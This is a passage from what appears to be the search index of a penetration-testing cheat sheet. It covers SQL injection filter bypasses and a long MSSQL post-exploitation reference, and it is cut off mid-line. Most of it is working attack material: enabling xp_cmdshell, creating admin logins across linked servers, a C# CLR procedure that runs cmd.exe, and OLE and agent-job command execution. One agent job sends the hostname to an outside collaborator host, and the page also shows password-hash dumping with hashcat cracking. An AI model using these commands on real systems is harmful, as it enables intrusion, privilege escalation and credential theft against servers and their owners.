substring(version(),1,1)in(4,3)\n?id=1 and substring(version(),1,1) between 3 and 4\n</code></pre>"},{"location":"sql-injection-attacks/#case-modification","title":"Case modification","text":"<ul> <li>Bypass using uppercase/lowercase (see keyword AND)   <pre><code>?id=1 AND 1=1#\n?id=1 AnD 1=1#\n?id=1 aNd 1=1#\n</code></pre></li> <li>Bypass using keywords case insensitive / Bypass using an equivalent operator   <pre><code>AND   -&gt; &amp;&amp;\nOR    -&gt; ||\n=     -&gt; LIKE,REGEXP, BETWEEN, not &lt; and not &gt;\n&gt; X   -&gt; not between 0 and X\nWHERE -&gt; HAVING\n</code></pre></li> </ul>"},{"location":"sql-injection-attacks/#labs","title":"Labs","text":"<ul> <li>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</li> <li>SQL injection vulnerability allowing login bypass</li> <li>SQL injection with filter bypass via XML encoding</li> <li>SQL Labs</li> </ul>"},{"location":"sql-injection-attacks/#references","title":"References","text":"<ul> <li>Detect SQLi</li> <li>Manual SQL Injection Discovery Tips</li> <li>NetSPI SQL Injection Wiki</li> <li>MySQL:</li> <li>PentestMonkey's mySQL injection cheat sheet</li> <li>Reiners mySQL injection Filter Evasion Cheatsheet</li> <li>Alternative for Information_Schema.Tables in MySQL</li> <li>The SQL Injection Knowledge base</li> <li>MSSQL:</li> <li>EvilSQL's Error/Union/Blind MSSQL Cheatsheet</li> <li>PentestMonkey's MSSQL SQLi injection Cheat Sheet</li> <li>ORACLE:</li> <li>PentestMonkey's Oracle SQLi Cheatsheet</li> <li>POSTGRESQL:</li> <li>PentestMonkey's Postgres SQLi Cheatsheet</li> <li>Others</li> <li>SQLi Cheatsheet - NetSparker</li> <li>Access SQLi Cheatsheet</li> <li>PentestMonkey's Ingres SQL Injection Cheat Sheet</li> <li>Pentestmonkey's DB2 SQL Injection Cheat Sheet</li> <li>Pentestmonkey's Informix SQL Injection Cheat Sheet</li> <li>SQLite3 Injection Cheat sheet</li> <li>Ruby on Rails (Active Record) SQL Injection Guide</li> <li>ForkBombers SQLMap Tamper Scripts Update</li> <li>SQLi in INSERT worse than SELECT</li> <li>Manual SQL Injection Tips</li> <li>Second Order:</li> <li>Analyzing CVE-2018-6376 \u2013 Joomla!, Second Order SQL Injection</li> <li>Exploiting Second Order SQLi Flaws by using Burp &amp; Custom Sqlmap Tamper</li> <li>Sqlmap:</li> <li>#SQLmap protip @zh4ck</li> <li>WAF:</li> <li>SQLi Optimization and Obfuscation Techniques by Roberto Salgado</li> <li>A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection</li> </ul>"},{"location":"sql-injection-attacks/MSSQL-injection/","title":"MSSQL Server","text":""},{"location":"sql-injection-attacks/MSSQL-injection/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Identify Instances and Databases<ul> <li>Discover Local SQL Server Instances</li> <li>Discover Domain SQL Server Instances</li> <li>Discover Remote SQL Server Instances</li> <li>Identify Encrypted databases </li> <li>Version Query</li> </ul> </li> <li>Identify Sensitive Information<ul> <li>Get Tables from a Specific Database</li> <li>Gather 5 Entries from Each Column</li> <li>Gather 5 Entries from a Specific Table</li> <li>Dump common information from server to files</li> </ul> </li> <li>Linked Database<ul> <li>Find Trusted Link</li> <li>Execute Query Through The Link</li> <li>Crawl Links for Instances in the Domain </li> <li>Crawl Links for a Specific Instance</li> <li>Query Version of Linked Database</li> <li>Execute Procedure on Linked Database</li> <li>Determine Names of Linked Databases </li> <li>Determine All the Tables Names from a Selected Linked Database</li> <li>Gather the Top 5 Columns from a Selected Linked Table</li> <li>Gather Entries from a Selected Linked Column</li> </ul> </li> <li>Command Execution via xp_cmdshell</li> <li>Extended Stored Procedure<ul> <li>Add the extended stored procedure and list extended stored procedures</li> </ul> </li> <li>CLR Assemblies<ul> <li>Execute commands using CLR assembly</li> <li>Manually creating a CLR DLL and importing it</li> </ul> </li> <li>OLE Automation<ul> <li>Execute commands using OLE automation procedures</li> </ul> </li> <li>Agent Jobs<ul> <li>Execute commands through SQL Agent Job service</li> <li>List All Jobs</li> </ul> </li> <li>External Scripts<ul> <li>Python</li> <li>R</li> </ul> </li> <li>Audit Checks<ul> <li>Find and exploit impersonation opportunities </li> </ul> </li> <li>Find databases that have been configured as trustworthy</li> <li>Manual SQL Server Queries<ul> <li>Query Current User &amp; determine if the user is a sysadmin</li> <li>Current Role</li> <li>Current DB</li> <li>List all tables</li> <li>List all databases</li> <li>All Logins on Server</li> <li>All Database Users for a Database </li> <li>List All Sysadmins</li> <li>List All Database Roles</li> <li>Effective Permissions from the Server</li> <li>Effective Permissions from the Database</li> <li>Find SQL Server Logins Which can be Impersonated for the Current Database</li> <li>Exploiting Impersonation</li> <li>Exploiting Nested Impersonation</li> <li>MSSQL Accounts and Hashes</li> </ul> </li> <li>References</li> </ul>"},{"location":"sql-injection-attacks/MSSQL-injection/#tools","title":"Tools","text":"<ul> <li>NetSPI/PowerUpSQL - A PowerShell Toolkit for Attacking SQL Server</li> <li>skahwah/SQLRecon - A C# MS SQL toolkit designed for offensive reconnaissance and post-exploitation.</li> </ul>"},{"location":"sql-injection-attacks/MSSQL-injection/#identify-instances-and-databases","title":"Identify Instances and Databases","text":""},{"location":"sql-injection-attacks/MSSQL-injection/#discover-local-sql-server-instances","title":"Discover Local SQL Server Instances","text":"<pre><code>Get-SQLInstanceLocal\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#discover-domain-sql-server-instances","title":"Discover Domain SQL Server Instances","text":"<pre><code>Get-SQLInstanceDomain -Verbose\n# Get Server Info for Found Instances\nGet-SQLInstanceDomain | Get-SQLServerInfo -Verbose\n# Get Database Names\nGet-SQLInstanceDomain | Get-SQLDatabase -NoDefaults\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#discover-remote-sql-server-instances","title":"Discover Remote SQL Server Instances","text":"<pre><code>Get-SQLInstanceBroadcast -Verbose\nGet-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#identify-encrypted-databases","title":"Identify Encrypted databases","text":"<p>Note: These are automatically decrypted for admins</p> <pre><code>Get-SQLDatabase -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Verbose | Where-Object {$_.is_encrypted -eq \"True\"}\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#version-query","title":"Version Query","text":"<pre><code>Get-SQLInstanceDomain | Get-Query \"select @@version\"\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#identify-sensitive-information","title":"Identify Sensitive Information","text":""},{"location":"sql-injection-attacks/MSSQL-injection/#get-tables-from-a-specific-database","title":"Get Tables from a Specific Database","text":"<pre><code>Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DBNameFromGet-SQLDatabaseCommand&gt; -NoDefaults\nGet Column Details from a Table\nGet-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DBName&gt; -TableName &lt;TableName&gt;\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#gather-5-entries-from-each-column","title":"Gather 5 Entries from Each Column","text":"<pre><code>Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords \"&lt;columnname1,columnname2,columnname3,columnname4,columnname5&gt;\" -Verbose -SampleSize 5\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#gather-5-entries-from-a-specific-table","title":"Gather 5 Entries from a Specific Table","text":"<pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query 'select TOP 5 * from &lt;DatabaseName&gt;.dbo.&lt;TableName&gt;'\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#dump-common-information-from-server-to-files","title":"Dump common information from server to files","text":"<pre><code>Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\\Instance1 -csv\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#linked-database","title":"Linked Database","text":""},{"location":"sql-injection-attacks/MSSQL-injection/#find-trusted-link","title":"Find Trusted Link","text":"<pre><code>select * from master..sysservers\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#execute-query-through-the-link","title":"Execute Query Through The Link","text":"<pre><code>-- execute query through the link\nselect * from openquery(\"dcorp-sql1\", 'select * from master..sysservers')\nselect version from openquery(\"linkedserver\", 'select @@version as version');\n\n-- chain multiple openquery\nselect version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")')\n\n-- execute shell commands\nEXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer\nselect 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"')\n\n-- create user and give admin privileges\nEXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"\nEXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#crawl-links-for-instances-in-the-domain","title":"Crawl Links for Instances in the Domain","text":"<p>A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results</p> <pre><code>Get-SQLInstanceDomain | Get-SQLServerLink -Verbose\nselect * from master..sysservers\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#crawl-links-for-a-specific-instance","title":"Crawl Links for a Specific Instance","text":"<pre><code>Get-SQLServerLinkCrawl -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Verbose\nselect * from openquery(\"&lt;instance&gt;\",'select * from openquery(\"&lt;instance2&gt;\",''select * from master..sysservers'')')\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#query-version-of-linked-database","title":"Query Version of Linked Database","text":"<pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"select * from openquery(`\"&lt;DBSERVERNAME\\DBInstance&gt;`\",'select @@version')\" -Verbose\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#execute-procedure-on-linked-database","title":"Execute Procedure on Linked Database","text":"<pre><code>SQL&gt; EXECUTE('EXEC sp_configure ''show advanced options'',1') at \"linked.database.local\";\nSQL&gt; EXECUTE('RECONFIGURE') at \"linked.database.local\";\nSQL&gt; EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at \"linked.database.local\";\nSQL&gt; EXECUTE('RECONFIGURE') at \"linked.database.local\";\nSQL&gt; EXECUTE('exec xp_cmdshell whoami') at \"linked.database.local\";\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#determine-names-of-linked-databases","title":"Determine Names of Linked Databases","text":"<p>tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query.</p> <pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"select * from openquery(`\"&lt;DatabaseLinkName&gt;`\",'select name from sys.databases')\" -Verbose\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#determine-all-the-tables-names-from-a-selected-linked-database","title":"Determine All the Tables Names from a Selected Linked Database","text":"<p>The result is TableName which feeds into following query</p> <pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"select * from openquery(`\"&lt;DatabaseLinkName&gt;`\",'select name from &lt;DatabaseNameFromPreviousCommand&gt;.sys.tables')\" -Verbose\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#gather-the-top-5-columns-from-a-selected-linked-table","title":"Gather the Top 5 Columns from a Selected Linked Table","text":"<p>The results are ColumnName and ColumnValue which feed into following query</p> <pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"select * from openquery(`\"&lt;DatabaseLinkName&gt;`\",'select TOP 5 * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt;')\" -Verbose\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#gather-entries-from-a-selected-linked-column","title":"Gather Entries from a Selected Linked Column","text":"<pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"select * from openquery(`\"&lt;DatabaseLinkName&gt;`\"'select * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt; where &lt;ColumnNameFromPreviousCommand&gt;=&lt;ColumnValueFromPreviousCommand&gt;')\" -Verbose\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#command-execution-via-xp_cmdshell","title":"Command Execution via xp_cmdshell","text":"<p>xp_cmdshell disabled by default since SQL Server 2005</p> <pre><code>PowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command whoami\n\n# Creates and adds local user backup to the local administrators group:\nPowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"net user backup Password1234 /add'\" -Verbose\nPowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"net localgroup administrators backup /add\" -Verbose\n</code></pre> <ul> <li>Manually execute the SQL query     <pre><code>EXEC xp_cmdshell \"net user\";\nEXEC master..xp_cmdshell 'whoami'\nEXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';\nEXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';\n</code></pre></li> <li>If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)     <pre><code>EXEC sp_configure 'show advanced options',1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1;\nRECONFIGURE;\n</code></pre></li> <li>If the procedure was uninstalled     <pre><code>sp_addextendedproc 'xp_cmdshell','xplog70.dll'\n</code></pre></li> </ul>"},{"location":"sql-injection-attacks/MSSQL-injection/#extended-stored-procedure","title":"Extended Stored Procedure","text":""},{"location":"sql-injection-attacks/MSSQL-injection/#add-the-extended-stored-procedure-and-list-extended-stored-procedures","title":"Add the extended stored procedure and list extended stored procedures","text":"<pre><code># Create evil DLL\nCreate-SQLFileXpDll -OutFile C:\\temp\\test.dll -Command \"echo test &gt; c:\\temp\\test.txt\" -ExportName xp_test\n\n# Load the DLL and call xp_test\nGet-SQLQuery -UserName sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"sp_addextendedproc 'xp_test', '\\\\10.10.0.1\\temp\\test.dll'\"\nGet-SQLQuery -UserName sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"EXEC xp_test\"\n\n# Listing existing\nGet-SQLStoredProcedureXP -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Verbose\n</code></pre> <ul> <li>Build a DLL using xp_evil_template.cpp</li> <li>Load the DLL     <pre><code>-- can also be loaded from UNC path or Webdav\nsp_addextendedproc 'xp_calc', 'C:\\mydll\\xp_calc.dll'\nEXEC xp_calc\nsp_dropextendedproc 'xp_calc'\n</code></pre></li> </ul>"},{"location":"sql-injection-attacks/MSSQL-injection/#clr-assemblies","title":"CLR Assemblies","text":"<p>Prerequisites: * sysadmin privileges * CREATE ASSEMBLY permission (or) * ALTER ASSEMBLY permission (or)</p> <p>The execution takes place with privileges of the service account.</p>"},{"location":"sql-injection-attacks/MSSQL-injection/#execute-commands-using-clr-assembly","title":"Execute commands using CLR assembly","text":"<pre><code># Create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string\nCreate-SQLFileCLRDll -ProcedureName \"runcmd\" -OutFile runcmd -OutDir C:\\Users\\user\\Desktop\n\n# Execute command using CLR assembly\nInvoke-SQLOSCmdCLR -Username sa -Password &lt;password&gt; -Instance &lt;instance&gt; -Command \"whoami\" -Verbose\nInvoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"whoami\" Verbose\nInvoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"powershell -e &lt;base64&gt;\" -Verbose\n\n# List all the stored procedures added using CLR\nGet-SQLStoredProcedureCLR -Instance &lt;instance&gt; -Verbose\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#manually-creating-a-clr-dll-and-importing-it","title":"Manually creating a CLR DLL and importing it","text":"<p>Create a C# DLL file with the following content, with the command : <code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:library c:\\temp\\cmd_exec.cs</code></p> <pre><code>using System;\nusing System.Data;\nusing System.Data.SqlClient;\nusing System.Data.SqlTypes;\nusing Microsoft.SqlServer.Server;\nusing System.IO;\nusing System.Diagnostics;\nusing System.Text;\n\npublic partial class StoredProcedures\n{\n    [Microsoft.SqlServer.Server.SqlProcedure]\n    public static void cmd_exec (SqlString execCommand)\n    {\n        Process proc = new Process();\n        proc.StartInfo.FileName = @\"C:\\Windows\\System32\\cmd.exe\";\n        proc.StartInfo.Arguments = string.Format(@\" /C {0}\", execCommand.Value);\n        proc.StartInfo.UseShellExecute = false;\n        proc.StartInfo.RedirectStandardOutput = true;\n        proc.Start();\n\n        // Create the record and specify the metadata for the columns.\n        SqlDataRecord record = new SqlDataRecord(new SqlMetaData(\"output\", SqlDbType.NVarChar, 4000));\n\n        // Mark the beginning of the result set.\n        SqlContext.Pipe.SendResultsStart(record);\n\n        // Set values for each column in the row\n        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());\n\n        // Send the row back to the client.\n        SqlContext.Pipe.SendResultsRow(record);\n\n        // Mark the end of the result set.\n        SqlContext.Pipe.SendResultsEnd();\n\n        proc.WaitForExit();\n        proc.Close();\n    }\n};\n</code></pre> <p>Then follow these instructions:</p> <ol> <li>Enable <code>show advanced options</code> on the server     <pre><code>sp_configure 'show advanced options',1; \nRECONFIGURE\nGO\n</code></pre></li> <li>Enable CLR on the server     <pre><code>sp_configure 'clr enabled',1\nRECONFIGURE\nGO\n</code></pre></li> <li>Import the assembly     <pre><code>CREATE ASSEMBLY my_assembly\nFROM 'c:\\temp\\cmd_exec.dll'\nWITH PERMISSION_SET = UNSAFE;\n</code></pre></li> <li>Link the assembly to a stored procedure     <pre><code>CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];\nGO\n</code></pre></li> <li>Execute and clean     <pre><code>cmd_exec \"whoami\"\nDROP PROCEDURE cmd_exec\nDROP ASSEMBLY my_assembly\n</code></pre></li> </ol> <p>CREATE ASSEMBLY will also accept an hexadecimal string representation of a CLR DLL</p> <pre><code>CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM \n0x4D5A90000300000004000000F[TRUNCATED]\nWITH PERMISSION_SET = UNSAFE \nGO \n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#ole-automation","title":"OLE Automation","text":"<ul> <li> Disabled by default</li> <li>The execution takes place with privileges of the service account.</li> </ul>"},{"location":"sql-injection-attacks/MSSQL-injection/#execute-commands-using-ole-automation-procedures","title":"Execute commands using OLE automation procedures","text":"<pre><code>Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"whoami\" Verbose\n</code></pre> <pre><code># Enable OLE Automation\nEXEC sp_configure 'show advanced options', 1\nEXEC sp_configure reconfigure\nEXEC sp_configure 'OLE Automation Procedures', 1\nEXEC sp_configure reconfigure\n\n# Execute commands\nDECLARE @execmd INT\nEXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT\nEXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\\system32\\cmd.exe /c'\n</code></pre> <pre><code># https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py\npython3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll\npython3 mssqlclient.py 'host/username:password@10.10.10.10' -check -reciclador 'C:\\windows\\temp\\reciclador.dll'\npython3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador 'C:\\windows\\temp\\reciclador.dll'\nSQL&gt; enable_ole\nSQL&gt; upload reciclador.dll C:\\windows\\temp\\reciclador.dll\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#agent-jobs","title":"Agent Jobs","text":"<ul> <li>The execution takes place with privileges of the SQL Server Agent service account if a proxy account is not configured.</li> <li> Require sysadmin or SQLAgentUserRole, SQLAgentReaderRole, and SQLAgentOperatorRole roles to create a job.</li> </ul>"},{"location":"sql-injection-attacks/MSSQL-injection/#execute-commands-through-sql-agent-job-service","title":"Execute commands through SQL Agent Job service","text":"<pre><code>Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"powershell e &lt;base64encodedscript&gt;\" -Verbose\nSubsystem Options:\n\u2013Subsystem CmdExec\n-SubSystem PowerShell\n\u2013Subsystem VBScript\n\u2013Subsystem Jscript\n</code></pre> <pre><code>USE msdb; \nEXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; \nEXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup \"$name.redacted.burpcollaborator.net\"', @retry_attempts = 1, @retry_interval = 5 ;\nEXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; \nEXEC dbo.sp_start_job N'test_powershell_job1';\n\n-- delete\nEXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#list-all-jobs","title":"List All Jobs","text":"<pre><code>SELECT job_id, [name] FROM msdb.dbo.sysjobs;\nSELECT job.job_id, notify_level_email, name, enabled, description, step_name, command, server, database_name FROM msdb.dbo.sysjobs job INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id = steps.job_id\nGet-SQLAgentJob -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -username sa -Password Password1234 -Verbose\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#external-scripts","title":"External Scripts","text":"<p> You need to enable external scripts.</p> <pre><code>sp_configure 'external scripts enabled', 1;\nRECONFIGURE;\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#python","title":"Python:","text":"<pre><code>Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"powershell -e &lt;base64encodedscript&gt;\" -Verbose\n\nEXEC sp_execute_external_script @language =N'Python',@script=N'import subprocess p = subprocess.Popen(\"cmd.exe /c whoami\", stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), \"utf-8\")])'\nWITH RESULT SETS (([cmd_out] nvarchar(max)))\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#r","title":"R","text":"<pre><code>Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"powershell -e &lt;base64encodedscript&gt;\" -Verbose\n\nEXEC sp_execute_external_script @language=N'R',@script=N'OutputDataSet &lt;- data.frame(system(\"cmd.exe /c dir\",intern=T))'\nWITH RESULT SETS (([cmd_out] text));\nGO\n\n@script=N'OutputDataSet &lt;-data.frame(shell(\"dir\",intern=T))'\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#audit-checks","title":"Audit Checks","text":""},{"location":"sql-injection-attacks/MSSQL-injection/#find-and-exploit-impersonation-opportunities","title":"Find and exploit impersonation opportunities","text":"<ul> <li>Impersonate as: <code>EXECUTE AS LOGIN = 'sa'</code></li> <li>Impersonate <code>dbo</code> with DB_OWNER     <pre><code>SQL&gt; select is_member('db_owner');\nSQL&gt; execute as user = 'dbo'\nSQL&gt; SELECT is_srvrolemember('sysadmin')\n</code></pre></li> </ul> <pre><code>Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Exploit -Verbose\n\n# impersonate sa account\npowerpick Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')\" -Verbose -Debug\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#find-databases-that-have-been-configured-as-trustworthy","title":"Find databases that have been configured as trustworthy","text":"<pre><code>Invoke-SQLAuditPrivTrustworthy -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Exploit -Verbose \n\nSELECT name as database_name, SUSER_NAME(owner_sid) AS database_owner, is_trustworthy_on AS TRUSTWORTHY from sys.databases\n</code></pre> <p>The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound.</p> <pre><code>Invoke-SQLAuditPrivXpDirtree\nInvoke-SQLUncPathInjection\nInvoke-SQLAuditPrivXpFileexist\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#manual-sql-server-queries","title":"Manual SQL Server Queries","text":""},{"location":"sql-injection-attacks/MSSQL-injection/#query-current-user-determine-if-the-user-is-a-sysadmin","title":"Query Current User &amp; determine if the user is a sysadmin","text":"<pre><code>select suser_sname()\nSelect system_user\nselect is_srvrolemember('sysadmin')\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#current-role","title":"Current Role","text":"<pre><code>Select user\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#current-db","title":"Current DB","text":"<pre><code>select db_name()\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#list-all-tables","title":"List all tables","text":"<pre><code>select table_name from information_schema.tables\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#list-all-databases","title":"List all databases","text":"<pre><code>select name from master..sysdatabases\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#all-logins-on-server","title":"All Logins on Server","text":"<pre><code>Select * from sys.server_principals where type_desc != 'SERVER_ROLE'\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#all-database-users-for-a-database","title":"All Database Users for a Database","text":"<pre><code>Select * from sys.database_principals where type_desc != 'database_role';\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#list-all-sysadmins","title":"List All Sysadmins","text":"<pre><code>SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#list-all-database-roles","title":"List All Database Roles","text":"<pre><code>SELECT DB1.name AS DatabaseRoleName,\nisnull (DB2.name, 'No members') AS DatabaseUserName\nFROM sys.database_role_members AS DRM\nRIGHT OUTER JOIN sys.database_principals AS DB1\nON DRM.role_principal_id = DB1.principal_id\nLEFT OUTER JOIN sys.database_principals AS DB2\nON DRM.member_principal_id = DB2.principal_id\nWHERE DB1.type = 'R'\nORDER BY DB1.name;\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#effective-permissions-from-the-server","title":"Effective Permissions from the Server","text":"<pre><code>select * from fn_my_permissions(null, 'server');\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#effective-permissions-from-the-database","title":"Effective Permissions from the Database","text":"<pre><code>SELECT * FROM fn_dp1my_permissions(NULL, 'DATABASE');\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#find-sql-server-logins-which-can-be-impersonated-for-the-current-database","title":"Find SQL Server Logins Which can be Impersonated for the Current Database","text":"<pre><code>select distinct b.name\nfrom sys.server_permissions a\ninner join sys.server_principals b\non a.grantor_principal_id = b.principal_id\nwhere a.permission_name = 'impersonate'\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#exploiting-impersonation","title":"Exploiting Impersonation","text":"<pre><code>SELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\nEXECUTE AS LOGIN = 'adminuser'\nSELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\nSELECT ORIGINAL_LOGIN()\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#exploiting-nested-impersonation","title":"Exploiting Nested Impersonation","text":"<pre><code>SELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\nEXECUTE AS LOGIN = 'stduser'\nSELECT SYSTEM_USER\nEXECUTE AS LOGIN = 'sa'\nSELECT IS_SRVROLEMEMBER('sysadmin')\nSELECT ORIGINAL_LOGIN()\nSELECT SYSTEM_USER\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#mssql-accounts-and-hashes","title":"MSSQL Accounts and Hashes","text":"<pre><code>MSSQL 2000:\nSELECT name, password FROM master..sysxlogins\nSELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)\n\nMSSQL 2005\nSELECT name, password_hash FROM master.sys.sql_logins\nSELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins\n</code></pre> <p>Then crack passwords using Hashcat : <code>hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt --force</code></p> <pre><code>131 MSSQL (2000)    0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578\n132 MSSQL 